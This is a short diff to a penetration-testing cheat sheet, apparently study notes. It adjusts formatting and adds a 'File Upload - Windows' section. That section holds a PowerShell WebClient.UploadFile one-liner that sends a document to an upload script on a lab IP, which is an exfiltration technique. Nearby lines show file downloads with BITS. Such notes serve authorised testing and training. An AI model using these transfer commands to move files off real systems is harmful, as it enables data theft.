@@ -13,7 +13,7 @@
 1. Local server in current directory: `python3 -m http.server PORT`
 
 2. Local server in specified directory:
-   
+
     `python3 -m http.server PORT --directory DIRECTORY`
 
 ## Msfvenom CheatSheet
@@ -88,6 +88,12 @@ LinPeas and Winpeas located ate my `Privesc_scripts` repository.
 
 6. ```powershell
    Start-BitsTransfer -Source https://IP:PORT/FILE -Destination "C:\FULL\PATH\FILE"
+   ```
+
+### File Upload - Windows
+
+1. ```powershell
+   powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
    ```
 
 ### File Download - Linux
